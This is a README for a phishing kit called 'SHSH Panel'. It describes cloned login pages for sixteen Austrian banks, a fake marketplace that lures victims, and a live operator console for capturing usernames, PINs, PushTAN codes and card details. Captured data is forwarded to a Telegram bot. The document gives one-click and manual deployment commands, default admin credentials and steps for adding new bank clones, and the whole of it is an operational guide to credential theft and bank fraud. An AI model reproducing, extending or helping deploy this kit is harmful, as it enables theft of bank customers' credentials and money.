# SHSH Panel — Full Stack Phishing Management System

A complete turnkey solution for managing Austrian bank login pages with a real-time operator console, Telegram alerts, and credit card processing.

---

## What's Inside

```
shsh_final/
├── shsh-panel/          # Admin panel + API (Next.js 16)
│   ├── src/             # Panel source code
│   ├── site/            # Public listing site (marketplace clone)
│   └── prisma/          # Database schema
├── banks/               # 16 bank login pages
│   ├── raiffeisen-login/
│   ├── vkb-login/
│   ├── oberbank-login/
│   ├── bank99-login/
│   ├── hypo-login/
│   ├── austria-next/
│   ├── burgenland-next/
│   ├── hypo-vorarlberg-next/
│   ├── hyponoe-next/
│   ├── hypotirol-next/
│   ├── mypaylife-next/
│   ├── poso-next/
│   ├── volks-next/
│   ├── bawag-next/
│   ├── easybank-next/
│   └── sparkasse-next/
├── database/            # PostgreSQL dumps (ready to restore)
├── configs/             # Nginx + PM2 configs
├── deploy.sh            # One-click deployment script
└── README.md            # This file
```

---

## How It Works — The Full Flow

### 1. Victim lands on a listing page

The marketplace site (`site/`) shows fake product listings. Each listing has a "Geld bekommen fur" (Get paid) button that leads to a payment method selection:

- **Bankuberweisung** — Opens a bank picker, then redirects to the selected bank's login page
- **Kreditkarte** — Opens a credit card form (number, expiry, CVC, name)

### 2. Bank login flow

When the victim selects a bank and enters credentials:

```
Login Page → [Waiting Screen] → [PushTAN Page]
     ↑              ↑                  ↑
   Victim      Operator decides    Operator sends
   enters      what happens next   the TAN code
   creds
```

**Step by step:**

1. Victim enters username/PIN on the bank login page
2. Data is instantly sent to the panel via `trackSubmission()` API
3. A **session** is created — appears live in the Operator Console
4. Victim sees a **waiting/loading screen** ("Ihre Daten werden uberpruft...")
5. Operator reviews the data and decides:
   - **Forward to PushTAN** — enters a Vergleichswert code (e.g. "AB99"), victim sees PushTAN screen with that code
   - **Back to login** — sends victim back to re-enter credentials
   - **Show error** — displays an error message on victim's screen
6. On the PushTAN screen, victim enters the TAN code
7. TAN code is sent to the panel
8. Operator can **reject** (wrong code) or **accept** (redirect to success/real bank)

### 3. Credit card flow

Same pattern but for cards:

```
Card Form → [Waiting Screen] → [PushTAN / 3D Secure]
```

1. Victim enters card number, name, expiry, CVC
2. Data sent to panel, session created
3. Waiting screen shown
4. Operator sees card data in the **Credit Cards** tab
5. Can forward to 3D Secure verification (PushTAN screen with code)

### 4. Real-time operator console

The operator has full control through the web panel:

- **Operator Console** (`/operator`) — All bank sessions
- **Credit Cards** (`/operator/cards`) — Card-only sessions with masked card display
- **Banks** (`/banks`) — Enable/disable banks, toggle Kreditkarte option
- **Settings** (`/settings`) — Telegram bot, API keys, domain config

---

## Operator Console — Commands

| Command | What it does | When to use |
|---------|-------------|-------------|
| **Forward to PushTAN** | Sends victim to TAN screen with your code | After reviewing login creds |
| **Back to Login** | Returns victim to the login form | If creds look fake |
| **Show Error** | Shows error message on victim's screen | "Wrong password" etc |
| **Clear Error** | Removes the error message | After showing an error |
| **Reject TAN** | Shows "TAN incorrect" on PushTAN screen | If TAN is wrong |
| **Wrong code, retry** | Resets TAN input + timer | Need a new TAN |
| **Redirect** | Sends victim to any URL | After successful capture |
| **Close Session** | Removes session from the list | When done |

---

## Telegram Alerts

Every time a victim submits data (login, TAN, card), a Telegram notification is sent:

```
🏦 Raiffeisen — login
📦 iPhone 17 Pro Max
🌐 IP: 203.0.113.42

bundesland: Wien
verfueger: 12345678
pin: secretpin
```

**Setup:** Go to Settings in the panel, enter your Telegram Bot Token and Chat ID.

---

## Bank Pages — Port Map

| Bank | Port | basePath | URL |
|------|------|----------|-----|
| Panel | 8500 | / | `http://SERVER/` (via nginx) |
| Site | 3001 | / | `http://SERVER:3001` |
| VKB | 3010 | /vkb | `http://SERVER/vkb/{slug}` |
| Oberbank | 3011 | /oberbank | `http://SERVER/oberbank/{slug}` |
| Bank99 | 3012 | /bank99 | `http://SERVER/bank99/{slug}` |
| Hypobank | 3013 | /hypobank | `http://SERVER/hypobank/{slug}` |
| Raiffeisen | 3014 | /raiffeisen | `http://SERVER/raiffeisen/{slug}` |
| Bank Austria | 3015 | /bank-austria | `http://SERVER/bank-austria/{slug}` |
| Burgenland | 3016 | /burgenland | `http://SERVER/burgenland/{slug}` |
| Hypo Vorarlberg | 3017 | /hypo-vorarlberg | `http://SERVER/hypo-vorarlberg/{slug}` |
| Hypo NOE | 3018 | /hypo-noe | `http://SERVER/hypo-noe/{slug}` |
| Hypo Tirol | 3019 | /hypotirol | `http://SERVER/hypotirol/{slug}` |
| Mypaylife | 3020 | /mypaylife | `http://SERVER/mypaylife/{slug}` |
| Poso | 3021 | /poso | `http://SERVER/poso/{slug}` |
| Volksbank | 3022 | /volksbank | `http://SERVER/volksbank/{slug}` |
| BAWAG | 3023 | /bawag | `http://SERVER/bawag/{slug}` |
| easybank | 3024 | /easybank | `http://SERVER/easybank/{slug}` |
| Sparkasse | 3025 | /sparkasse | `http://SERVER/sparkasse/{slug}` |

---

## Deployment — Fresh Server

### Requirements
- Ubuntu 24.04 LTS
- 4+ vCPU, 8+ GB RAM, 80+ GB SSD
- Root access

### One-click deploy

```bash
# Upload the project to your server
scp -r shsh_final/ root@YOUR_SERVER:/root/shsh_final/

# SSH in and run
ssh root@YOUR_SERVER
cd /root/shsh_final
chmod +x deploy.sh
./deploy.sh
```

That's it. Everything will be installed, configured, and running.

### Manual deploy

If you prefer doing it step by step:

```bash
# 1. Install deps
apt update && apt install -y nginx postgresql postgresql-contrib nodejs npm
npm install -g pm2

# 2. Setup DB
sudo -u postgres psql -c "CREATE USER shsh WITH PASSWORD 'shsh_secure_2024';"
sudo -u postgres psql -c "CREATE DATABASE shsh_panel OWNER shsh;"
sudo -u postgres pg_restore --no-owner --no-acl -d shsh_panel database/shsh_panel_final.dump

# 3. Copy files
cp -R shsh-panel /opt/shsh-panel
cp -R banks /opt/banks

# 4. Set .env (replace YOUR_IP)
echo 'DATABASE_URL="postgresql://shsh:shsh_secure_2024@localhost:5432/shsh_panel"
NEXTAUTH_SECRET="your-random-secret-here"
NEXTAUTH_URL="http://YOUR_IP:8500"
NEXT_PUBLIC_SITE_URL="http://YOUR_IP:3001"' > /opt/shsh-panel/.env

for dir in /opt/banks/*/; do
  echo "NEXT_PUBLIC_PANEL_URL=http://YOUR_IP:8500" > "$dir/.env"
done

# 5. Install & build
cd /opt/shsh-panel && npm install && npx prisma generate && npm run build
cd /opt/shsh-panel/site && npm install && npm run build
for dir in /opt/banks/*/; do cd "$dir" && npm install && npm run build; done

# 6. Start with PM2 (see deploy.sh for full list)
cd /opt/shsh-panel && pm2 start npm --name panel -- start -- -p 8500
# ... (repeat for all banks)
pm2 save && pm2 startup

# 7. Configure nginx
cp configs/nginx/sites-enabled/shsh-panel /etc/nginx/sites-enabled/
systemctl reload nginx
```

---

## Admin Panel

### Login
- URL: `http://SERVER:8500/login`
- Username: `admin`
- Password: `admin123`

### Pages

| Page | Description |
|------|-------------|
| `/dashboard` | Overview — total listings, published count, value |
| `/listings` | All listings with status, price, edit/delete |
| `/listings/new` | Create a new listing |
| `/chat` | Live chat with victims per listing |
| `/banks` | Bank management — enable/disable banks + Kreditkarte toggle |
| `/operator` | **Real-time operator console** — bank sessions |
| `/operator/cards` | **Credit card sessions** — card data with mask/reveal |
| `/settings` | Telegram bot, API config, domain settings |

### Settings to configure

1. **Telegram Bot Token** — Create a bot via @BotFather, paste the token
2. **Telegram Chat ID** — Your personal chat ID (get it from @userinfobot)
3. **Global bank flow** — Toggle to show/hide Bankuberweisung option site-wide
4. **Credit card option** — Toggle to show/hide Kreditkarte option site-wide

---

## Session Short Codes

Every session gets a unique short code like `#0001`, `#0042`. These are displayed in:
- Operator Console session list
- Telegram notifications (coming soon)
- Can be used for quick reference between operators

---

## Tech Stack

- **Frontend:** Next.js 16, React 19, Tailwind CSS
- **Backend:** Next.js API routes, Prisma ORM
- **Database:** PostgreSQL 16
- **Auth:** NextAuth.js (credentials provider)
- **Process Manager:** PM2
- **Reverse Proxy:** Nginx
- **Real-time:** HTTP polling (2s interval)

---

## Useful Commands

```bash
# Check all services
pm2 list

# View logs
pm2 logs panel
pm2 logs raiffeisen

# Restart everything
pm2 restart all

# Restart a single bank
pm2 restart bawag

# Check nginx
nginx -t && systemctl reload nginx

# Database access
sudo -u postgres psql -d shsh_panel

# View active sessions
sudo -u postgres psql -d shsh_panel -c 'SELECT bs."shortCode", b.name, bs."currentStep" FROM "BankSession" bs JOIN "Bank" b ON bs."bankId" = b.id WHERE bs."closedAt" IS NULL ORDER BY bs."createdAt" DESC;'
```

---

## Troubleshooting

| Problem | Solution |
|---------|----------|
| Bank page shows "localhost" errors | Check `.env` in the bank directory — `NEXT_PUBLIC_PANEL_URL` must point to your server IP |
| Session not appearing in Operator | Bank didn't create a session — check browser console for CORS/fetch errors |
| Telegram not sending | Check Settings — bot token + chat ID must be correct. Test: `curl https://api.telegram.org/botYOUR_TOKEN/sendMessage -d "chat_id=YOUR_ID&text=test"` |
| Login 401 error | `NEXTAUTH_URL` in `.env` must match the URL you're accessing the panel from |
| PM2 processes crashing | Check `pm2 logs PROCESS_NAME` for errors. Usually a build issue — run `npm run build` in the project dir |

---

## Adding a New Bank

1. Create a new Next.js project in `banks/`
2. Add `basePath` and `assetPrefix` in `next.config.ts`
3. Copy `lib/track.ts` from any existing bank
4. Create `components/ClientShell.tsx` with `startSession("your-slug")`
5. Create `components/LoginForm.tsx` with `trackSubmission("your-slug", "login", data)`
6. Create `app/[[...slug]]/page.tsx` (catch-all route)
7. Create `app/waiting/page.tsx` + `components/WaitingScreen.tsx`
8. Create `app/pushtan/page.tsx` + `components/PushTanForm.tsx`
9. Add the bank to the database: `INSERT INTO "Bank" ...`
10. Add to nginx config and PM2
11. Set `.env` with `NEXT_PUBLIC_PANEL_URL`
12. Build and restart

---

Built with Next.js 16, deployed on Ubuntu 24.04 with PM2 + Nginx.
